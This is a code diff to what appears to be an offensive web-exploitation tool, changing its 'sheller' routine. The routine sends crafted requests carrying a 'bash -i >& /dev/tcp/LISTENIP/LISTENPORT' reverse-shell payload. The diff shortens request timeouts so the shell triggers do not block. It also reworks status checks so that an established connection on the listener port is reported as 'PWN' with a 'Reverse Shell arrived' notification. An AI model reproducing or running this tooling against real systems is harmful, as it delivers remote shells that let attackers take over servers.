@@ -837,6 +837,9 @@ def sheller(
         PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1".format(
             vars.LISTENIP, vars.LISTENPORT,
         )
+        # don't wait for shell requests to finish, so that
+        # script doesn't block & shows if shell worked
+        timeout2 = 0.0000000001
         if technique != 6:
             if attack == 1:
                 prep = query(
@@ -871,7 +874,7 @@ def sheller(
                 gui.show()
                 app.processEvents()
             try:
-                s.send(prep, timeout=timeout)
+                s.send(prep, timeout=timeout2)
                 show_status(gui)
                 if app:
                     app.processEvents()
@@ -895,7 +898,7 @@ def sheller(
                 gui.show()
                 app.processEvents()
             try:
-                s.send(prep, timeout=timeout)
+                s.send(prep, timeout=timeout2)
                 show_status(gui)
                 if app:
                     app.processEvents()
@@ -919,7 +922,7 @@ def sheller(
                 gui.show()
                 app.processEvents()
             try:
-                s.send(prep, timeout=timeout)
+                s.send(prep, timeout=timeout2)
                 show_status(gui)
                 if app:
                     app.processEvents()
@@ -945,7 +948,7 @@ def sheller(
                 app.processEvents()
             try:
                 s.send(prep2, timeout=timeout)
-                s.send(prep, timeout=timeout)
+                s.send(prep, timeout=timeout2)
                 show_status(gui)
                 if app:
                     app.processEvents()
@@ -970,7 +973,7 @@ def sheller(
                 app.processEvents()
             try:
                 s.send(prep2, timeout=timeout)
-                s.send(prep, timeout=timeout)
+                s.send(prep, timeout=timeout2)
                 show_status(gui)
                 if app:
                     app.processEvents()
@@ -993,7 +996,7 @@ def sheller(
                 app.processEvents()
             try:
                 s.send(prep2, timeout=timeout)
-                s.send(prep, timeout=timeout)
+                s.send(prep, timeout=timeout2)
                 show_status(gui)
                 if app:
                     app.processEvents()
@@ -1041,7 +1044,7 @@ def sheller(
                     if app:
                         app.processEvents()
                 try:
-                    s.send(prep, timeout=timeout)
+                    s.send(prep, timeout=timeout2)
                     show_status(gui)
                     if app:
                         app.processEvents()
@@ -1097,7 +1100,7 @@ def sheller(
                     if app:
                         app.processEvents()
                 try:
-                    s.send(prep, timeout=timeout)
+                    s.send(prep, timeout=timeout2)
                     show_status(gui)
                     if app:
                         app.processEvents()
@@ -1186,7 +1189,7 @@ def sheller(
                     random_ua(s)
                     prep = post_json(url, data, s)
                 try:
-                    s.send(prep, timeout=timeout)
+                    s.send(prep, timeout=timeout2)
                     show_status(gui)
                     if app:
                         app.processEvents()
@@ -1245,7 +1248,7 @@ def sheller(
 
                 if prep:
                     try:
-                        s.send(prep, timeout=timeout)
+                        s.send(prep, timeout=timeout2)
                         show_status(gui)
                         if app:
                             app.processEvents()
@@ -1316,13 +1319,27 @@ def show_status(gui, timeout=False, exception=None):
             gui.show()
         return
     if timeout:
-        sys.stdout.write("{0} FAIL{2}|{1}\n".format(
-            color.O, color.END, color.END + color.RD
-        ))
-        print("{0}Timeout{1}".format(color.O, color.END))
-        if gui:
-            gui.crawlerResultDisplay.append(" FAIL\nTimeout\n")
-            gui.show()
+        if check_conn():
+            # single threaded server times out when
+            # shell drops
+            sys.stdout.write("{0} PWN {2}|{1}\n".format(
+                color.O, color.END, color.END + color.RD
+            ))
+            notify(
+                "Reverse Shell arrived on Port {}.".format(
+                    vars.LISTENPORT
+                )
+            )
+            if gui:
+                gui.crawlerResultDisplay.append(" PWN\n")
+                gui.show()
+        else:
+            sys.stdout.write("{0} DIED{2}|{1}\n".format(
+                color.O, color.END, color.END + color.RD
+            ))
+            if gui:
+                gui.crawlerResultDisplay.append(" FAIL\nTimeout\n")
+                gui.show()
         return
     if check_conn():
         sys.stdout.write("{0} PWN {2}|{1}\n".format(
@@ -1345,18 +1362,18 @@ def show_status(gui, timeout=False, exception=None):
             gui.show()
 
 
-def check_conn():
+def check_conn(delay=True):
     """
     check if our reverse shell has arrived
     """
     # give the server some time
-    time.sleep(2)
+    if delay:
+        time.sleep(2)
     try:
         # list all connections
         connections = psutil.net_connections()
         for connection in connections:
-            # we are interested in our netcat socket
-            if connection.laddr[1] == vars.LISTENPORT:
+            if connection.laddr[1] == int(vars.LISTENPORT):
                 if connection.status == psutil.CONN_ESTABLISHED:
                     # shell has arrived, all good
                     return True
